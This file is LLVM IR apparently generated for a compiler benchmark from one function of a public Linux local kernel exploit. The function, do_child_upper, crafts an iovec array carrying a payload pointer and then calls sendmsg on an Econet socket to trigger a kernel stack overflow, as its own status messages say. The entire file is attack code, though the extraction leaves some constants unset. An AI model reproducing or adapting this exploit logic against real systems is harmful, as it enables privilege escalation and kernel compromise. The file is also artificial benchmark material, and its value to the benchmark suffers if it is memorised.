; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_do_child_upper.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_do_child_upper.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_ec = type { i32, i32, %struct.iovec*, i64, %struct.sockaddr_ec*, i32 }
%struct.iovec = type { i32, i8* }
%struct.msghdr = type { i32, i32, %struct.iovec*, i64, %struct.msghdr*, i32 }
%struct.ifreq = type { i32, i32, %struct.iovec*, i64, %struct.ifreq*, i32 }

@IOVS = common dso_local global i32 0, align 4
@payload_child = common dso_local global i64 0, align 8
@STACK_OFFSET = common dso_local global i32 0, align 4
@PF_ECONET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [46 x i8] c"[-] failed creating econet socket, aborting!\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"lo\00", align 1
@SIOCSIFADDR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [49 x i8] c"[-] failed setting interface address, aborting!\0A\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c"[+] upper child triggering stack overflow...\0A\00", align 1
@errno = common dso_local global i64 0, align 8
@EFAULT = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [47 x i8] c"[-] sendmsg succeeded unexpectedly, aborting!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_child_upper() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_ec, align 8
  %5 = alloca %struct.msghdr, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.ifreq, align 8
  %9 = alloca i8*, align 8
  %10 = load i32, i32* @IOVS, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %6, align 8
  %13 = alloca %struct.iovec, i64 %11, align 16
  store i64 %11, i64* %7, align 8
  %14 = load i64, i64* @payload_child, align 8
  %15 = inttoptr i64 %14 to i8*
  store i8* %15, i8** %9, align 8
  %16 = load i8*, i8** %9, align 8
  %17 = getelementptr inbounds i8, i8* %16, i64 4
  store i8* %17, i8** %9, align 8
  %18 = call i32 @sleep(i32 1)
  store i32 0, i32* %1, align 4
  br label %19

19:                                               ; preds = %32, %0
  %20 = load i32, i32* %1, align 4
  %21 = load i32, i32* @STACK_OFFSET, align 4
  %22 = icmp slt i32 %20, %21
  br i1 %22, label %23, label %35

23:                                               ; preds = %19
  %24 = load i32, i32* %1, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %25
  %27 = getelementptr inbounds %struct.iovec, %struct.iovec* %26, i32 0, i32 1
  store i8* null, i8** %27, align 8
  %28 = load i32, i32* %1, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %29
  %31 = getelementptr inbounds %struct.iovec, %struct.iovec* %30, i32 0, i32 0
  store i32 0, i32* %31, align 16
  br label %32

32:                                               ; preds = %23
  %33 = load i32, i32* %1, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %1, align 4
  br label %19

35:                                               ; preds = %19
  %36 = load i8*, i8** %9, align 8
  %37 = load i32, i32* @STACK_OFFSET, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %38
  %40 = getelementptr inbounds %struct.iovec, %struct.iovec* %39, i32 0, i32 1
  store i8* %36, i8** %40, align 8
  %41 = load i32, i32* @STACK_OFFSET, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %42
  %44 = getelementptr inbounds %struct.iovec, %struct.iovec* %43, i32 0, i32 0
  store i32 582, i32* %44, align 16
  %45 = load i32, i32* @STACK_OFFSET, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %60, %35
  %48 = load i32, i32* %1, align 4
  %49 = load i32, i32* @IOVS, align 4
  %50 = icmp slt i32 %48, %49
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %53
  %55 = getelementptr inbounds %struct.iovec, %struct.iovec* %54, i32 0, i32 1
  store i8* inttoptr (i64 -4294967296 to i8*), i8** %55, align 8
  %56 = load i32, i32* %1, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 %57
  %59 = getelementptr inbounds %struct.iovec, %struct.iovec* %58, i32 0, i32 0
  store i32 0, i32* %59, align 16
  br label %60

60:                                               ; preds = %51
  %61 = load i32, i32* %1, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %1, align 4
  br label %47

63:                                               ; preds = %47
  %64 = load i32, i32* @PF_ECONET, align 4
  %65 = load i32, i32* @SOCK_DGRAM, align 4
  %66 = call i32 @socket(i32 %64, i32 %65, i32 0)
  store i32 %66, i32* %3, align 4
  %67 = load i32, i32* %3, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %69, label %72

69:                                               ; preds = %63
  %70 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0))
  %71 = call i32 @exit(i32 1) #4
  unreachable

72:                                               ; preds = %63
  %73 = bitcast %struct.ifreq* %8 to %struct.sockaddr_ec*
  %74 = call i32 @memset(%struct.sockaddr_ec* %73, i32 0, i32 40)
  %75 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %8, i32 0, i32 5
  %76 = load i32, i32* %75, align 8
  %77 = call i32 @strcpy(i32 %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* @SIOCSIFADDR, align 4
  %80 = bitcast %struct.ifreq* %8 to %struct.sockaddr_ec*
  %81 = call i32 @ioctl(i32 %78, i32 %79, %struct.sockaddr_ec* %80)
  store i32 %81, i32* %2, align 4
  %82 = load i32, i32* %2, align 4
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %87

84:                                               ; preds = %72
  %85 = call i32 @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.2, i64 0, i64 0))
  %86 = call i32 @exit(i32 1) #4
  unreachable

87:                                               ; preds = %72
  %88 = call i32 @memset(%struct.sockaddr_ec* %4, i32 0, i32 40)
  %89 = bitcast %struct.msghdr* %5 to %struct.sockaddr_ec*
  %90 = call i32 @memset(%struct.sockaddr_ec* %89, i32 0, i32 40)
  %91 = bitcast %struct.sockaddr_ec* %4 to %struct.msghdr*
  %92 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %5, i32 0, i32 4
  store %struct.msghdr* %91, %struct.msghdr** %92, align 8
  %93 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %5, i32 0, i32 0
  store i32 40, i32* %93, align 8
  %94 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %5, i32 0, i32 3
  store i64 0, i64* %94, align 8
  %95 = getelementptr inbounds %struct.iovec, %struct.iovec* %13, i64 0
  %96 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %5, i32 0, i32 2
  store %struct.iovec* %95, %struct.iovec** %96, align 8
  %97 = load i32, i32* @IOVS, align 4
  %98 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %5, i32 0, i32 1
  store i32 %97, i32* %98, align 4
  %99 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %100 = load i32, i32* %3, align 4
  %101 = bitcast %struct.msghdr* %5 to %struct.sockaddr_ec*
  %102 = call i32 @sendmsg(i32 %100, %struct.sockaddr_ec* %101, i32 0)
  store i32 %102, i32* %2, align 4
  %103 = load i32, i32* %2, align 4
  %104 = icmp ne i32 %103, -1
  br i1 %104, label %109, label %105

105:                                              ; preds = %87
  %106 = load i64, i64* @errno, align 8
  %107 = load i64, i64* @EFAULT, align 8
  %108 = icmp ne i64 %106, %107
  br i1 %108, label %109, label %112

109:                                              ; preds = %105, %87
  %110 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  %111 = call i32 @exit(i32 1) #4
  unreachable

112:                                              ; preds = %105
  %113 = load i32, i32* %3, align 4
  %114 = call i32 @close(i32 %113)
  %115 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %115)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(%struct.sockaddr_ec*, i32, i32) #2

declare dso_local i32 @strcpy(i32, i8*) #2

declare dso_local i32 @ioctl(i32, i32, %struct.sockaddr_ec*) #2

declare dso_local i32 @sendmsg(i32, %struct.sockaddr_ec*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
